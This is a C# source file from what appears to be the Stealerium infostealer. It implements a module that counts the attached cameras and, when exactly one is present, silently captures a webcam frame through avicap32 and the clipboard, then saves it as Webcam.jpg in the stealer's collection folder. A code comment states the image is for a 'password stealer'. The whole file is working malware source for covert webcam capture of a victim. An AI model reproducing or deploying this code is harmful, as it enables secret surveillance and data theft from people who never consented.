using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Management;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Stealerium.Helpers;

namespace Stealerium.Target.System
{
    internal sealed class WebcamScreenshot
    {
        private static IntPtr _handle;
        private static readonly int delay = 3000;

        [DllImport("avicap32.dll", EntryPoint = "capCreateCaptureWindowA")]
        private static extern IntPtr capCreateCaptureWindowA(string lpszWindowName, int dwStyle, int x, int y,
            int nWidth, int nHeight, int hwndParent, int nId);

        [DllImport("user32", EntryPoint = "SendMessage")]
        private static extern int SendMessage(IntPtr hWnd, uint msg, int wParam, int lParam);


        // Get connected cameras count
        public static int GetConnectedCamerasCount()
        {
            var cameras = 0;
            try
            {
                using (var searcher =
                       new ManagementObjectSearcher(
                           "SELECT * FROM Win32_PnPEntity WHERE (PNPClass = 'Image' OR PNPClass = 'Camera')"))
                {
                    foreach (var dummy in searcher.Get())
                        cameras++;
                }
            }
            catch
            {
                Logging.Log("GetConnectedCamerasCount : Query failed");
            }

            return cameras;
        }

        // Create screenshot for password stealer
        public static bool Make(string sSavePath)
        {
            // If webcam disabled => skip
            if (Config.WebcamScreenshot != "1")
                return false;

            // If connected one camera
            var count = GetConnectedCamerasCount();
            if (count != 1)
                return Logging.Log($"WebcamScreenshot : Camera screenshot failed. (Count {count})", false);

            try
            {
                Clipboard.Clear();
                _handle = capCreateCaptureWindowA("WebCap", 0, 0, 0, 320, 240, 0, 0);
                // Initialize webcamera
                SendMessage(_handle, 1034, 0, 0);
                SendMessage(_handle, 1074, 0, 0);
                // Delay
                Thread.Sleep(delay);
                // Capture frame
                SendMessage(_handle, 1084, 0, 0);
                SendMessage(_handle, 1054, 0, 0);
                // Stop webcamera
                SendMessage(_handle, 1035, 0, 0);
                // Save
                var image = (Image) Clipboard.GetDataObject()
                    ?.GetData(DataFormats.Bitmap);
                Clipboard.Clear();
                if (image != null)
                {
                    image.Save(sSavePath + "\\Webcam.jpg", ImageFormat.Jpeg);
                    image.Dispose();
                }

                Counter.WebcamScreenshot = true;
            }
            catch (Exception ex)
            {
                return Logging.Log("WebcamScreenshot : Camera screenshot failed.\n" + ex, false);
            }

            return true;
        }
    }
}